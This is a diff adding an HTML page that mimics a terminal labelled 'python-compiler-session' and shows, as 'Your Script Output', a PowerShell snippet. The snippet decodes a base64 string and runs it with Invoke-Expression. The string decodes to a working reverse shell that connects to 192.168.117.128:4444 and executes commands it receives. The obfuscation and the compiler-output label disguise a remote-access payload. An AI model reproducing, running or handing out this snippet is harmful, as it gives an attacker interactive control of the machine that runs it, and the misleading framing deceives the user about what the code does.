@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacker Code Block</title>
+    <!-- Load Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Optional: Set the body to a darker background to enhance the code block contrast */
+        body {
+            background-color: #1a202c; /* Equivalent to bg-gray-900 */
+            color: #e2e8f0; /* Light text for surrounding content */
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+    </style>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        mono: ['Roboto Mono', 'monospace'],
+                    },
+                },
+            },
+        };
+    </script>
+</head>
+<body>
+
+    <!--
+        THE CODE CONTAINER
+        This single div contains all the "inline" styling via Tailwind classes
+        to give it that classic dark, terminal look.
+    -->
+    <div class="max-w-xl w-full">
+        <h1 class="text-2xl font-bold mb-4 text-center">Your Script Output 🔥</h1>
+
+        <!-- The main code block styled for a dark terminal aesthetic -->
+        <div class="bg-gray-900 shadow-2xl rounded-xl overflow-hidden border-2 border-green-500/50">
+            
+            <!-- Terminal Header Bar -->
+            <div class="flex items-center p-3 bg-gray-800 border-b border-gray-700/50">
+                <div class="flex space-x-2">
+                    <span class="w-3 h-3 bg-red-500 rounded-full"></span>
+                    <span class="w-3 h-3 bg-yellow-500 rounded-full"></span>
+                    <span class="w-3 h-3 bg-green-500 rounded-full"></span>
+                </div>
+                <div class="flex-grow text-center text-sm font-semibold text-gray-400 select-none">
+                    python-compiler-session
+                </div>
+            </div>
+
+            <!-- Code Content Area -->
+            <pre class="p-4 overflow-x-auto text-sm leading-relaxed font-mono">
+<code class="text-white">
+<span class="text-cyan-400">$encodedScript = 'JGNsaWVudD1OZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoJzE5Mi4xNjguMTE3LjEyOCcsNDQ0NCk7JHN0cmVhbT0kY2xpZW50LkdldFN0cmVhbSgpOyRidWZmZXI9MC4uNjU1MzV8JXswfTt3aGlsZSgoJGk9JHN0cmVhbS5SZWFkKCRidWZmZXIsMCwkYnVmZmVyLkxlbmd0aCkpLW5lIDApeyRkYXRhPShOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ1ZmZlciwwLCRpKTskc2VuZD0oaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmQyPSRzZW5kICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzskYnl0ZXM9KFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kMik7JHN0cmVhbS5Xcml0ZSgkYnl0ZXMsMCwkYnl0ZXMuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKQ=='
+$decodedScript = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedScript))
+Invoke-Expression $decodedScript</span>
+
+
+</code>
+            </pre>
+        </div>
+    </div>
+
+</body>
+</html>
